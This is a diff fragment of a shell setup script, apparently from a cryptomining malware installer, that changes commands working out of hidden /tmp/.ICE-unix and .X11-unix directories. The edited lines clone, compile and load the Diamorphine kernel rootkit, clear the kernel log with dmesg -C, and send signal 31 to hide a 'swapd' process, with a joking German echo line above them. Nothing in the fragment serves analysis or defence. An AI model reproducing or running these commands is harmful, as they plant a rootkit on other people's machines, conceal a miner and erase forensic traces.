@@ -364,11 +364,11 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt instal
 
 echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
-#echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
-#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+# echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
+# cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y ; apt-get install linux-generic git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install linux-generic git make gcc -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo "[*] Setup complete"
 
